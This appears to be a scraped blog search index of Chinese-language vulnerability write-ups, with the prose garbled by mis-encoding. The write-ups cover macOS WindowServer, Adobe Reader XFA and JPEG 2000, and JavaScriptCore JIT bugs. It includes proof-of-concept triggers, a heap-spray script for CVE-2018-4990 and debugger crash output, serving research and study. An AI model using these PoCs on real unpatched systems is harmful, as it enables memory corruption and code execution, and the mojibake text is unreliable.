runtimeä¸­åˆ©ç”¨slide-effectæ¥ä¿®æ”¹ä¸€äº›å¯¹è±¡ç±»å‹ã€é•¿åº¦ç­‰ä¿¡æ¯ï¼Œæ¥è§¦å‘ä¸€äº›ç±»å‹æ··æ·†ã€è¶Šç•Œçš„æƒ…å†µå¾ˆå¤šï¼Œä¸ä»…ä»…åœ¨jscå¼•æ“ï¼Œä½†æ˜¯è¿™äº›åŸºæœ¬å·²ç»æˆä¸ºå†å²äº†ã€‚ è¿™ç§ç±»å‹çš„æ¼æ´ï¼Œåœ¨2016å¹´keen lab åœ¨pocçš„è®®é¢˜ä¸­æåˆ°äº†å¾ˆå¤šï¼Œå…¶ä¸­ä¹Ÿæœ‰ç±»ä¼¼4622è¿™ä¸ªæ´çš„ä¸€äº›å…¶ä»–æ¼æ´ã€‚ 3. å…³äºè°ƒè¯•è¿™ä¸ªæ´æ–°ç‰ˆæœ¬çš„macosä¸Šç¼–è¯‘æœ‰ç‚¹éº»çƒ¦ï¼Œéœ€è¦è€ç‰ˆsdkï¼Œä¸æƒ³æŠ˜è…¾çš„ï¼Œç›´æ¥è£…è€ç‰ˆæœ¬çš„macOSè™šæ‹Ÿæœºå°±è¡Œï¼Œè¿™æ˜¯æœ€ç®€å•çš„åŠæ³•ï¼›å¦‚æœä½ é€‰æ‹©è‡ªå·±ç¼–è¯‘ï¼Œæ…¢æ…¢ä¿®é”™è¯¯å§ã€‚ã€‚é—®é¢˜å¤ªå¤šäº†ã€‚ å¦‚æœè°ƒæ´ï¼ŒLinuxä¹Ÿå¯ä»¥ï¼Œç›´æ¥build-jsc-onlyå°±å¥½äº†ã€‚ lldbè°ƒè¯•çš„è¯ï¼Œæ¨èVoltronæ’ä»¶ï¼ŒåŒæ—¶æ¨èæˆ‘å†™çš„tmuxè„šæœ¬ã€‚ 0x05:å¼•ç”¨æ”»å‡»JavaScriptå¼•æ“ï¼šä¸€ä¸ªJavaScriptCoreçš„å­¦ä¹ æ¡ˆä¾‹(CVE-2016-4622 (2016-10-27)) attacking_javascript_engines","link":"/2019/04/06/CVE-2016-4622-analysis/"},{"title":"CVE-2017-2541 __XGetWindowMovementGroup stackoverflow","text":"basic infosizeç”¨æˆ·å¯æ§ï¼Œarrayæ“ä½œæ—¶æ ˆæº¢å‡ºã€‚macOS 10.12.1 vuln12345678910111213141516171819202122232425262728293031323334353637383940414243void __fastcall get_window_group_list(__int64 a1, __int64 a2, unsigned int a3, __int64 a4, unsigned int *a5){ unsigned int *total_length; // r14 __int64 buffer_1; // rbx unsigned int size_param; // er15 __int64 v8; // rax __int64 v9; // r12 unsigned int length; // eax __int64 size_get_1; // ST00_8 _QWORD *buffer; // r15 unsigned __int64 idx; // r13 total_length = a5; buffer_1 = a4; size_param = a3; v8 = get_window_group(a1); v9 = v8; if ( v8 ) { length = CFArrayGetCount(v8); // user control if ( length &gt; size_param ) length = size_param; *total_length = length; size_get_1 = length; buffer = malloc(8LL * length); // size control idx = 0LL; CFArrayGetValues(v9, 0LL, size_get_1, buffer); if ( *total_length ) { do { CFNumberGetValue(buffer[idx++], 3LL, buffer_1);// buffer 's size is controled by user, overflow buffer_1 here buffer_1 += 4LL; } while ( idx &lt; *total_length ); } free(buffer); } else { *total_length = 0; }} arrayçš„sizeæ˜¯ç”¨æˆ·ä¼ é€’çš„ï¼Œä¹Ÿå°±æ˜¯è¯´å¯ä»¥æ§åˆ¶bufferçš„å¤§å°ï¼Œåœ¨ä¸­é—´çš„å¾ªç¯ä¸­ï¼Œåœ¨å†…å­˜è®¿é—®æ“ä½œä¸­å› ä¸ºsizeç”¨æˆ·å¯æ§ï¼Œå¯ä»¥å¯¼è‡´buffer_1 æº¢å‡ºã€‚ poc1234567891011121314151617181920CGWindowID r[2] = {0};//...mach_msg_return_t ret;msg_t message;mach_port_t replyPort = mig_get_reply_port();//go trigger the bug!memset(&amp;message, 0, sizeof(message));message.header.msgh_remote_port = getport;message.header.msgh_local_port = replyPort;message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);message.header.msgh_size = 40;message.header.msgh_id = 0x7210 + 0xc8;message.NDR = NDR_record;message.wid = r[0];message.length = 0x2010; 12sudo lldb ./main r éš¾çš„æ˜¯pocçš„æ„é€ ï¼Œä¸»è¦æ˜¯ä¼ é€’è¿‡æ¥çš„å‚æ•°(array)çš„æ„é€ ã€‚ referencezer0con2018_singi","link":"/2019/06/19/CVE-2017-2541-XGetWindowMovementGroup-stackoverflow/"},{"title":"CVE-2017-2540 _XGetConnectionPSN info leak","text":"basic infouninitialized stack var â€“&gt; info leakmacOS 10.12.1 vuln_FindProcessRecByConnectionID è°ƒç”¨å¤±è´¥åï¼Œä¼šç”¨æœªåˆå§‹åŒ–çš„æ ˆå˜é‡åšèµ‹å€¼æ“ä½œï¼Œå¯¼è‡´ä¿¡æ¯æ³„æ¼ã€‚ 1234567891011121314151617181920212223242526272829303132NDR_record_t __usercall _XGetConnectionPSN@&lt;rax&gt;(__int64 a1@&lt;rax&gt;, _DWORD *a2@&lt;rdi&gt;, __int64 a3@&lt;rsi&gt;){ __int64 savedregs; // ST08_8 __int64 v4; // rax __int64 v5; // rdx __int64 v6; // rcx NDR_record_t result; // rax savedregs = a1; if ( *a2 &lt; 0 || a2[1] != 0x24 ) { *(_DWORD *)(a3 + 32) = -304; result = NDR_record; *(NDR_record_t *)(a3 + 24) = NDR_record; } else { v4 = FindProcessRecByConnectionID((unsigned int)a2[8]); if ( v4 ) { v6 = *(_QWORD *)(v4 + 4); v5 = *(_QWORD *)(v4 + 4) &gt;&gt; 32; } *(_DWORD *)(a3 + 0x24) = v6; *(_DWORD *)(a3 + 0x28) = v5; // uninitialized *(_DWORD *)(a3 + 0x20) = 0; result = NDR_record; *(NDR_record_t *)(a3 + 24) = NDR_record; *(_DWORD *)(a3 + 4) = 44; } return result;} poc123456789101112131415161718192021222324void leak_addr(){ mach_msg_return_t ret; leak_msg_t message; mach_port_t replyPort = mig_get_reply_port(); memset(&amp;message, 0, sizeof(message)); message.header.msgh_remote_port = getport; message.header.msgh_local_port = replyPort; message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE); message.header.msgh_size = 36; message.header.msgh_id = 0x7210 + 0xff; message.NDR = NDR_record; message.size = 0; message.leak_addr = 0x1337; //if trigger leak bug successfully, it will be change to stack value. ret = mach_msg(&amp;(message.header), MACH_SEND_MSG | MACH_RCV_MSG, 36, 0xffff, replyPort, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL); if(ret != MACH_MSG_SUCCESS) { NSLog(@&quot;mach_msg fail.\\n&quot;); mach_error(&quot;mach_msg:&quot; , ret); } stack_addr = 0x7fff00000000 | message.leak_addr;} å†™pocçš„æ—¶å€™å‘ç°ä¸€ä¸ªé—®é¢˜ï¼Œä½¿ç”¨ä¹‹å‰å’Œfontdäº¤äº’çš„ä»£ç è·å–portï¼Œç„¶åå¡«å……mach msgçš„remote port æ— æ³•è§¦å‘æ¼æ´ï¼Œé—®äº†ä¸‹brightiupå¾—åˆ°äº†ç­”æ¡ˆï¼š 1ä½ è·å–çš„è¿™ä¸ªportæ˜¯è¿™ä¸ªmachæœåŠ¡çš„portï¼Œä»–è¿™ä¸ªä»£ç é‡Œé¢é€šè¿‡funcptrè·å¾—çš„portæ˜¯ä¸€ä¸ªå¯¹è±¡çš„portå¯ä»¥ç†è§£ä¸ºä¸€ä¸ªä¸Šä¸‹æ–‡ã€‚å…¶å®é‚£ä¸ªfuncptråº”è¯¥æ˜¯CGSCreateLayerContextå‡½æ•°ã€‚ æˆ‘è·å–åˆ°çš„portæ˜¯æ²¡æœ‰ä¸Šä¸‹æ–‡çš„ï¼Œæ‰€ä»¥æ— æ³•è§¦å‘æ¼æ´è·¯å¾„ã€‚ é‡æ–°çœ‹äº†å®Œæ•´åˆ©ç”¨åï¼Œå‘ç°è¿™ä¸ªoffsetå¯¹åº”çš„å‡½æ•°åº”è¯¥æ˜¯ CGSGetConnectionPortByIdã€‚ referencezer0con2018_singi","link":"/2019/06/19/CVE-2017-2540-XGetConnectionPSN-info-leak/"},{"title":"CVE-2018-12794 åˆ†æ","text":"0x00 : æ¼æ´ä¿¡æ¯XFA ç±»å‹æ··æ·†å¯¼è‡´OOBçš„æ¼æ´ã€‚ 0x01 : PoCåˆ©ç”¨è„šæœ¬æŠŠXFAå’ŒJSä»PDFé‡Œæ‹†åˆ†å‡ºæ¥ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;xdp:xdp xmlns:xdp='http://ns.adobe.com/xdp/'&gt; &lt;config xmlns:xfa='http://www.xfa.org/schema/xci/3.1/'&gt; &lt;present&gt; &lt;pdf&gt; &lt;interactive&gt; 1 &lt;/interactive&gt; &lt;scriptModel&gt; XFA &lt;/scriptModel&gt; &lt;encryption&gt; &lt;permissions&gt; &lt;/permissions&gt; &lt;/encryption&gt; &lt;/pdf&gt; &lt;/present&gt; &lt;acrobat&gt; &lt;acrobat7&gt; &lt;dynamicRender&gt; required &lt;/dynamicRender&gt; &lt;/acrobat7&gt; &lt;/acrobat&gt; &lt;/config&gt; &lt;template&gt; &lt;subform layout='tb' name='outerform'&gt; &lt;pageSet&gt; &lt;pageArea id='Page2' name='Page2'&gt; &lt;contentArea h='100mm' w='200mm' x='0.25in' y='0.25in'/&gt; &lt;medium long='297mm' short='210mm' stock='a4'/&gt; &lt;/pageArea&gt; &lt;/pageSet&gt; &lt;subform name=&quot;sub1&quot;&gt;&lt;/subform&gt; &lt;subform name=&quot;sub2&quot;&gt; &lt;calculate&gt; &lt;script contentType=&quot;application/x-javascript&quot;&gt; app.alert(&quot;crash...!&quot;); &lt;/script&gt; &lt;/calculate&gt; &lt;/subform&gt; &lt;/subform&gt; &lt;/template&gt; &lt;xfa:datasets xmlns:xfa='http://www.xfa.org/schema/xfa-data/1.0/'/&gt;&lt;/xdp:xdp&gt; jsä»£ç å¦‚ä¸‹ 12345o = xfa.resolveNode(&quot;xfa[0].template[0].outerform[0].sub1[0]&quot;); o2 = xfa.resolveNode(&quot;xfa[0].form[0].outerform[0].sub2[0]&quot;);o.nodes.append(o2); o2.presence = &quot;inactive&quot;;//will crash hereapp.alert(&quot;no crash!&quot;); PoCå¾ˆå¥½æ‡‚ï¼Œå°±æ˜¯æŠŠo2èŠ‚ç‚¹æ·»åŠ ä¸ºoçš„å­èŠ‚ç‚¹ï¼Œç„¶åè®¿é—®o2çš„presenceå±æ€§ï¼Œå¹¶ä¸”èµ‹å€¼ï¼Œå°±æ˜¯è®¿é—®ä¸€æ¬¡è¿™ä¸ªå±æ€§ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758(c74.700): Access violation - code c0000005 (first chance)First chance exceptions are reported before any exception handling.This exception may be expected and handled.eax=00000001 ebx=00000000 ecx=42f2eec0 edx=0013d164 esi=00000000 edi=42f2eec0eip=5c067d77 esp=0013cfd8 ebp=0013d034 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00210246AcroForm!PlugInMain+0x979d7:5c067d77 39b7d0010000 cmp dword ptr [edi+1D0h],esi ds:0023:42f2f090=????????0:000&gt; k10ChildEBP RetAddr WARNING: Stack unwind information not available. Following frames may be wrong.0013d034 5c05dd14 AcroForm!PlugInMain+0x979d70013d0d0 5c01cc57 AcroForm!PlugInMain+0x8d9740013d118 5c4dcc55 AcroForm!PlugInMain+0x4c8b70013d130 5c05daa4 AcroForm!DllUnregisterServer+0x3367ac0013d174 5c05d731 AcroForm!PlugInMain+0x8d7040013d1e8 6e4e90b2 AcroForm!PlugInMain+0x8d3910013d1ec 770665f4 verifier!VerifierDisableFaultInjectionExclusionRange+0x31620013d1f0 7702a0aa ntdll!RtlpNtMakeTemporaryKey+0x48b50013d1f4 76ff65a6 ntdll!EtwSetMark+0xe7430013d1f8 7556c3d4 ntdll!wcsnicmp+0xcaa0013d1fc 6b09ecfa kernel32!HeapFree+0x140013d204 5c32f87d MSVCR120!free+0x1a00000000 00000000 AcroForm!DllUnregisterServer+0x1893d40:000&gt; dd edi42f2eec0 5c78061c 00000002 42c64fe8 5c88d32842f2eed0 00000147 c0c0c0c0 c0c0c0d0 43884fe042f2eee0 43404e40 00000000 43832fb0 c0c0c0c242f2eef0 42f2eec0 2ff76fd8 00000000 0000000042f2ef00 2be4cf30 00000015 00000000 5c88f9b442f2ef10 5c88d328 43404e40 00000000 0000000042f2ef20 00000000 00000000 00000004 5c64095442f2ef30 00000000 5c640954 00000000 42e8afd00:000&gt; dd edi+1d042f2f090 ???????? ???????? ???????? ????????42f2f0a0 ???????? ???????? ???????? ????????42f2f0b0 ???????? ???????? ???????? ????????42f2f0c0 ???????? ???????? ???????? ????????42f2f0d0 ???????? ???????? ???????? ????????42f2f0e0 ???????? ???????? ???????? ????????42f2f0f0 ???????? ???????? ???????? ????????42f2f100 ???????? ???????? ???????? ????????0:000&gt; !heap -p -a edi address 42f2eec0 found in _DPH_HEAP_ROOT @ 1471000 in busy allocation ( DPH_HEAP_BLOCK: UserAddr UserSize - VirtAddr VirtSize) 431b130c: 42f2eec0 140 - 42f2e000 2000 ? AcroForm!DllUnregisterServer+5da173 6e4e8e89 verifier!VerifierDisableFaultInjectionExclusionRange+0x00002f39 77065e26 ntdll!RtlpNtMakeTemporaryKey+0x000040e7 7702a376 ntdll!EtwSetMark+0x0000ea0f 76ff5ae0 ntdll!wcsnicmp+0x000001e4 6b09ed63 MSVCR120!malloc+0x00000033 5bfd70ed AcroForm!PlugInMain+0x00006d4d 5c009e2d AcroForm!PlugInMain+0x00039a8d è¿™æ˜¯ä¸€ä¸ªè¶Šç•Œè¯»ã€‚ 0x02 : åˆ†æé¦–å…ˆæ ¹æ®callstackï¼Œå®šä½ä¸€ä¸‹æ¼æ´ç‚¹ä»¥åŠå‘ç”Ÿoobçš„å¯¹è±¡æ˜¯å•¥ã€‚ 1234567891011121314150:000&gt; k10ChildEBP RetAddr0013d034 5c05dd14 XFAFormModelImpl__isActivityExcluded 0013d0d0 5c01cc57 AcroForm!PlugInMain+0x8d9740013d118 5c4dcc55 AcroForm!PlugInMain+0x4c8b70013d130 5c05daa4 AcroForm!DllUnregisterServer+0x3367ac0013d174 5c05d731 sub_208FD8D50013d1e8 6e4e90b2 sub_208FD3BA 0013d1ec 770665f4 verifier!VerifierDisableFaultInjectionExclusionRange+0x31620013d1f0 7702a0aa ntdll!RtlpNtMakeTemporaryKey+0x48b50013d1f4 76ff65a6 ntdll!EtwSetMark+0xe7430013d1f8 7556c3d4 ntdll!wcsnicmp+0xcaa0013d1fc 6b09ecfa kernel32!HeapFree+0x140013d204 5c32f87d MSVCR120!free+0x1a00000000 00000000 sub_20BCF7CC // free wrp å‘ç”Ÿå´©æºƒçš„å‡½æ•°æ˜¯åœ¨XFAFormModelImpl__isActivityExcluded ï¼Œè¿™æ˜¯åœ¨æ“ä½œxfa.formå¯¹è±¡ï¼Œä½†æ˜¯å´å‘ç”Ÿäº†è¶Šç•Œã€‚è°ƒè¯•å‘ç°ï¼Œæ­¤æ—¶è®¿é—®çš„å¯¹è±¡å¹¶ä¸æ˜¯xfa.formå¯¹è±¡ï¼Œè€Œæ˜¯ä¸€ä¸ªå¤§å°ä¸º0x140çš„å¯¹è±¡ï¼Œçœ‹ä¸‹è¿™ä¸ªå¯¹è±¡çš„åˆ†é…æƒ…å†µï¼Œå¯ä»¥ç¡®å®šè¿™ä¸ªå¯¹è±¡çš„å¤§å°ã€ç±»å‹ä¿¡æ¯ã€‚å¾—åˆ°è¿™æ®µä»£ç çš„æ–¹æ³•æ˜¯ï¼šé¦–å…ˆheapå‘½ä»¤å¾—åˆ°å½“å‰å¯¹è±¡çš„åŸºæœ¬æƒ…å†µï¼Œæ‰¾åˆ°åˆ†é…çš„ä½ç½®ï¼Œä¸€èˆ¬æ¥è¯´c++å¯¹è±¡åˆ†é…æ˜¯å…ˆèµ°mallocä¹‹ç±»çš„åˆ†é…å™¨ï¼ˆç¨‹åºå¯èƒ½è‡ªå·±å°è£…mallocï¼‰åˆ†é…å†…å­˜ï¼ˆå¯¹è±¡å¤§å°ï¼‰ï¼Œç„¶ååˆå§‹åŒ–è™šè¡¨å•¥çš„ï¼Œæ‰€ä»¥mallocè°ƒç”¨å¾€å‰æ‰¾ä¸€ä¸ªå°±æ‰¾åˆ°äº†ã€‚ 123456789; __unwind { // loc_20E3F4E2push 8mov eax, offset loc_20E3F4E2call __EH_prolog3mov edi, ecxpush 140h ; size_t å¯¹è±¡å¤§å°call jfCacheManager_allocmov edx, eaxpop ecx äº¤å‰å¼•ç”¨å¾—åˆ°è¿™ä¸ªå¯¹è±¡æ˜¯ä¸€ä¸ªxfa.templateå¯¹è±¡ï¼Œä»¥ä¸‹æ˜¯ä¸¤ä¸ªå¯¹è±¡çš„æƒ…å†µï¼š xfa.template å¯¹è±¡å¤§å° 0x140xfa.form å¯¹è±¡å¤§å° 0x270æ‰€ä»¥è¿™æ˜¯ä¸€ä¸ªç±»å‹æ··æ·†æ¼æ´ï¼Œç¨‹åºé”™è¯¯çš„æŠŠxfa.templateå¯¹è±¡å½“ä½œxfa.formå¯¹è±¡æ¥è¯»å–æ•°æ®ï¼Œå¯¼è‡´è¶Šç•Œçš„å‘ç”Ÿï¼Œroot causeæ˜¯ç±»å‹æ··æ·†ã€‚ 0x03 : å¼•ç”¨using-type-confusion-to-get-code-execution-in-adobe-reader","link":"/2019/03/12/CVE-2018-12794-%E5%88%86%E6%9E%90/"},{"title":"CVE-2018-4990 analysis","text":"1jp2kçš„è¶Šç•Œè¯»ï¼Œè½¬æ¢2-freeçš„åˆ©ç”¨ã€‚ ç¯å¢ƒä¿¡æ¯Win7 x86Adobe Acrobat Reader 2018.011.20036 PoCä¸€å¼ ç‰¹æ®Šæ„é€ è¿‡çš„JP2Kå›¾ç‰‡ å¤§å°å’Œå†…å®¹éƒ½æ˜¯ç»è¿‡æ„é€ çš„ï¼Œè¿™é‡Œå…ˆè§¦å‘ä¸€ä¸‹æ¼æ´ï¼Œåˆ†ææ¼æ´æˆå› ã€‚ æ¼æ´åˆ†ææ‰“å¼€pageheapåï¼Œwindbgè°ƒè¯•ã€‚ 123456789101112131415161718192021222324250:000&gt; reax=00000000 ebx=00000000 ecx=6bf58598 edx=00000000 esi=00000000 edi=00000000eip=6bf2ba58 esp=00529b04 ebp=00529b20 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246verifier!VerifierStopMessage+0x1f8:6bf2ba58 cc int 30:000&gt; k10ChildEBP RetAddr WARNING: Stack unwind information not available. Following frames may be wrong.00529b20 6bf29ee0 verifier!VerifierStopMessage+0x1f800529b84 6bf26f11 verifier!VerifierDisableFaultInjectionExclusionRange+0x3f900052a16c 6bf26f95 verifier!VerifierDisableFaultInjectionExclusionRange+0xfc10052a190 6bf27240 verifier!VerifierDisableFaultInjectionExclusionRange+0x10450052a1ac 6bf29080 verifier!VerifierDisableFaultInjectionExclusionRange+0x12f00052a1c8 776b65f4 verifier!VerifierDisableFaultInjectionExclusionRange+0x31300052a210 7767a0aa ntdll!RtlpNtMakeTemporaryKey+0x48b50052a304 776465a6 ntdll!EtwSetMark+0xe7430052a324 7733c3d4 ntdll!wcsnicmp+0xcaa0052a338 69feecfa kernel32!HeapFree+0x140052a34c 64290574 MSVCR120!free+0x1a0052a46c 642a6482 JP2KLib!JP2KCopyRect+0xbae60052a4c4 65f06a24 JP2KLib!JP2KImageInitDecoderEx+0x240052a54c 65f083be AcroRd32_65910000!AX_PDXlateToHostEx+0x2615e50052a5ac 65efd459 AcroRd32_65910000!AX_PDXlateToHostEx+0x262f7f0052a5b8 65f06368 AcroRd32_65910000!AX_PDXlateToHostEx+0x25801a æ ¹æ®call stackå¾€å‰æ‰¾ï¼Œæ‰¾æ¼æ´è§¦å‘çš„ç‚¹ï¼Œç€é‡åˆ†æJP2KLibä¸­ä¸¤ä¸ªè°ƒç”¨ã€‚ 1234int __cdecl JP2KImageInitDecoderEx(Concurrency::details::SchedulerBase *a1, int a2, int a3, int a4, int a5){ return sub_1004F3BD(a2, a3, a4, a5);} å¯¹åº”çš„æ±‡ç¼– è°ƒè¯•ä¸€ä¸‹è¿™é‡Œï¼š å¯ä»¥å‘ç°ï¼Œè¿™ä¸ªå¾ªç¯ï¼Œæ¯æ¬¡è¯»å–8å­—èŠ‚ï¼Œå¾ªç¯æ¬¡æ•°0xffæ¬¡ã€‚ 123for(int idx = 0; idx &lt; 0xff; idx++){ //do read work...} æœ€åä¸€æ¬¡å¾ªç¯çš„æ—¶å€™ï¼Œidxæ˜¯0xfeï¼Œæ­¤æ—¶è¯»å–åˆ° 0xfe * 4ã€‚è°ƒè¯•å‘ç°ï¼Œ è¿™ä¸ªbuffer sizeåªæœ‰0xfd * 4 = 0x3f4è¿™ä¹ˆå¤§ï¼Œæ‰€ä»¥å¯¼è‡´è¶Šç•Œè¯»çš„å‘ç”Ÿã€‚ Exploit åˆ†æè¿™ä¸ªåˆ©ç”¨å¯ä»¥è¯´ååˆ†çš„å·§å¦™ï¼Œåˆ©ç”¨jså¸ƒå±€å†…å­˜ï¼ŒæŠŠè¶Šç•Œè¯»è½¬æ¢æˆäº†Double freeå®Œæˆåˆ©ç”¨ã€‚ å®Œæ•´Exploité“¾æ¥ å› ä¸ºéœ€è¦æå‰åšå†…å­˜å¸ƒå±€ï¼Œä¸èƒ½ç›´æ¥å°±è§¦å‘æ¼æ´ï¼Œæ‰€ä»¥éœ€è¦åˆ©ç”¨jså†å¸ƒå±€å†…å­˜å®Œæˆåï¼Œä¸»åŠ¨åœ°è§¦å‘æ¼æ´ï¼Œè¿™é‡Œçš„åšæ³•å’Œp2o 2017ï¼Œ360å®‰å…¨å›¢é˜Ÿæ‰“Readerçš„åˆ©ç”¨å¥—è·¯ä¸€æ ·ï¼ŒæŠŠå›¾ç‰‡æ”¾åµŒå…¥button field,å¹¶è®¾ç½®æŒ‰é’®ä¸å¯æ˜¾ç¤ºï¼Œåœ¨å¸ƒå±€å®Œæˆåï¼Œè®¾ç½®æŒ‰é’®å±æ€§å¯æ˜¾ï¼Œç„¶åè§¦å‘æ¼æ´ã€‚ 1234567891011121314151617181920212223242526var a = new Array(0x3000);var spraynum = 0x1000;var sprayarr = new Array(spraynum);var spraylen = 0x10000-24;var spraybase = 0x0d0e0048;var spraypos = 0x0d0f0058;// force allocations to prepare the heap for the oob readfor(var i1 = 1; i1 &lt; 0x3000; i1++){ a[i1] = new Uint32Array(252); // these will be freed a[i1][249] = spraybase; a[i1][250] = spraybase + 0x10000;}// heap spray to land ArrayBuffers at 0x0d0e0048 and 0x0d0f0048for(var i1 = 1; i1 &lt; spraynum; i1++){ sprayarr[i1] = new ArrayBuffer(spraylen);}// make holes so the oob read chunk lands herefor(var i1 = 1; i1 &lt; 0x3000; i1 = i1 + 2){ delete a[i1]; a[i1] = null;} å†…å­˜å¸ƒå±€çš„è¯ï¼Œåˆ©ç”¨ä¸­ä½¿ç”¨äº†ArrayBufferï¼Œåˆ©ç”¨å †å–·ï¼Œåˆ†é…å¤§é‡è¿ç»­çš„Arraybufferï¼Œå¹¶make holeï¼Œä½¿å¾—å›¾ç‰‡è§£æçš„æ—¶å€™æ­£å¥½åˆ†é…åˆ°å†…å­˜å¸ƒå±€çš„hole;éšåè§¦å‘è¶Šç•Œè¯»ï¼ŒæŠŠæ¼æ´è½¬æ¢æˆdouble freeå»åˆ©ç”¨ã€‚ â€‹ åˆ©ç”¨çš„åé¢é€šè¿‡sprayarr2çš„èµ‹å€¼æŠ¢å é‡Šæ”¾çš„0x20000å†…å­˜ï¼Œä¸€æ—¦æŠ¢å æˆåŠŸï¼Œsprayarrä¸­ä¹‹å‰è¢«é‡Šæ”¾çš„elmentçš„é•¿åº¦å°±ä¼šè¢«ä¿®æ”¹ä¸º0x20000ï¼›æœ€åé€šè¿‡ä¹‹å‰å†…å­˜å¸ƒå±€åç²¾å‡†çš„å†…å­˜é‡Šæ”¾(idx 249,250)è·å–ä¸€ä¸ªè¶…é•¿elementï¼Œä»¥å®ç°å…¨å±€å†…å­˜è¯»å†™ï¼Œå†é€šè¿‡å…¨å±€å†…å­˜è¯»å†™ï¼Œä¼ªé€ bookmarkRootçš„å¯¹è±¡å®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚ é‡åˆ°çš„é—®é¢˜(TODO)win7ä¸Šè¿™äº›åˆ†ææ²¡å•¥é—®é¢˜ï¼Œä¸€æ­¥æ­¥è°ƒè¯•ï¼Œå†…å­˜å¸ƒå±€ä¹Ÿæ²¡ä»€ä¹ˆé—®é¢˜ï¼›åœ¨win10ä¸Šå†…å­˜å¸ƒå±€å‡ºç°äº†ä¸è¿ç»­ã€å¤±æ•ˆç­‰æƒ…å†µï¼Œè¿™éƒ¨åˆ†TODOï¼Œéœ€è¦è§£å†³ã€‚ å‚è€ƒadobe-me-and-a-double-free å¯¹CVE-2018-4990æ¼æ´çš„è¡¥å……åˆ†æ CVE-2018-4990 Adobe Reader ä»£ç æ‰§è¡Œæ¼æ´åˆ©ç”¨åˆ†æ","link":"/2019/04/06/CVE-2018-4990-analysis/"},{"title":"CVE-2017-2547 åˆ†æ","text":"CVE-2017-2547 åˆ†æ jit bug ç¼ºå°‘è¾¹ç•Œæ£€æŸ¥å¯¼è‡´çš„è¶Šç•Œè¯». 0x00 : PoClokiçš„poc 12345678910function f() { let arr = new Uint32Array(10); for (let i = 0; i &lt; 0x100000; i++) { parseInt(); } arr[8] = 1; arr[-0x12345678] = 2;}f(); Tencent Team Sniperçš„poc 3.5448480588962e-310 å°±æ˜¯ 0x414141414140 0x01 : å‰ç½®çŸ¥è¯†DFG JIT : 1DFG JIT çš„ä½¿ç”¨å‰ææ˜¯å‡½æ•°è‡³å°‘å‘—è°ƒç”¨60æ¬¡ï¼Œæˆ–è€…å¾ªç¯æ‰§è¡Œè‡³å°‘1000æ¬¡ï¼Œæˆ–è€…2è€…åŒæƒå€¼ç»„åˆã€‚ 0x02 : åˆ†æé—®é¢˜å‘ç”Ÿåœ¨DFG JITä¸­ï¼Œè®¿é—®æ•°ç»„çš„æ—¶å€™å› ä¸ºç¼ºå°‘å¿…è¦çš„è¾¹ç•Œæ£€æŸ¥ï¼Œå¯¼è‡´è¶Šç•Œè®¿é—®ï¼Œå½“ç„¶è¿™ä¸ªæ´å¯ä»¥è½¬åŒ–æˆè¯»/å†™å†…å­˜ï¼Œç„¶åå¯¼è‡´rceã€‚ ç›´æ¥çœ‹ä»£ç ï¼šgit show f2476d46820b744450133f6b00a85e5265db1915 1234567891011121314151617 RangeKind m_kind;@@ -249,7 +258,13 @@ private: Node* maxNode; if (!data.m_key.m_source) {- minNode = 0;+ // data.m_key.m_source being null means that we're comparing against int32 constants (see rangeKeyAndAddend()).+ // Since CheckInBounds does an unsigned comparison, if the minBound &gt;= 0, it is also covered by the+ // maxBound comparison. However, if minBound &lt; 0, then CheckInBounds should always fail its speculation check.+ // We'll force an OSR exit in that case.+ minNode = nullptr;+ if (range.m_minBound &lt; 0)+ m_insertionSet.insertNode(nodeIndex, SpecNone, ForceOSRExit, node-&gt;origin); maxNode = m_insertionSet.insertConstant( nodeIndex, maxOrigin, jsNumber(range.m_maxBound)); } else {(END) è¿™é‡Œçœ‹åˆ°çš„é€»è¾‘å¤ªå°‘ï¼Œç›´æ¥å»æºç é‡Œæ‰¾ï¼š 1234567891011121314151617181920212223case ArrayBounds: { Node* minNode; Node* maxNode; if (!data.m_key.m_source) { // data.m_key.m_source being null means that we're comparing against int32 constants (see rangeKeyAndAddend()). // Since CheckInBounds does an unsigned comparison, if the minBound &gt;= 0, it is also covered by the // maxBound comparison. However, if minBound &lt; 0, then CheckInBounds should always fail its speculation check. // We'll force an OSR exit in that case. minNode = nullptr; if (range.m_minBound &lt; 0) m_insertionSet.insertNode(nodeIndex, SpecNone, ForceOSRExit, node-&gt;origin); maxNode = m_insertionSet.insertConstant( nodeIndex, maxOrigin, jsNumber(range.m_maxBound)); } else { minNode = insertAdd( nodeIndex, minOrigin, data.m_key.m_source, range.m_minBound, Arith::Unchecked); maxNode = insertAdd( nodeIndex, maxOrigin, data.m_key.m_source, range.m_maxBound, Arith::Unchecked); } .... è¿™é‡Œæ˜¯ä¸ºäº†ç¡®å®šè¦è®¿é—®çš„æ•°ç»„çš„è¾¹ç•Œï¼Œæ¯æ¬¡è®¿é—®ç¡®å®šæœ€å¤§å’Œæœ€å°å€¼ï¼Œä¸ºäº†åé¢æ¶ˆé™¤å†—ä½™èŠ‚ç‚¹ã€‚ï¼ˆæ¯”å¦‚ï¼Œå¤šæ¬¡è®¿é—®è¿™ä¸ªarrayçš„æ—¶å€™ï¼Œè®¿é—®äº†10ï¼Œåˆè®¿é—®äº†20ï¼Œé‚£ä¹ˆä»£ç åšæ£€æŸ¥çš„æ—¶å€™è‚¯å®šåªä¼šæ£€æµ‹æ˜¯ä¸æ˜¯å¤§äº20ï¼Œè€Œä¸ä¼šå†æ£€æŸ¥æ˜¯å¦å¤§äº10ï¼‰ã€‚åœ¨æœªpatchçš„æ—¶å€™ï¼Œè¾¹ç•Œæ£€æŸ¥çš„æ—¶Arrayçš„æœ€å°å€¼æ˜¯å¦æ˜¯è´Ÿæ•°æ˜¯æ²¡æœ‰åšæ£€æµ‹çš„ï¼ŒæŒ‰ç…§åŸæ¥çš„é€»è¾‘ï¼š 